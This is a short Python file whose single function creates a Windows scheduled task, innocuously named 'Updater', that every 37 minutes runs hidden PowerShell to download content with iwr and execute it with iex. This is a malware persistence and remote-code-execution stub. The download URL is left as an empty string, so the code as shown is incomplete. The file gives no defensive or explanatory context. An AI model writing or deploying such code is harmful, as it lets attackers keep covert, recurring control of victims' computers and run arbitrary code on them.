import subprocess

def schedule():
    subprocess.run(["schtasks", "/Create", "/TN", "Updater", "/SC", "MINUTE", "/MO", "37", "/TR",
        "powershell -NoProfile -WindowStyle Hidden -Command iwr "
        ""
        "-UseBasicParsing | iex"])
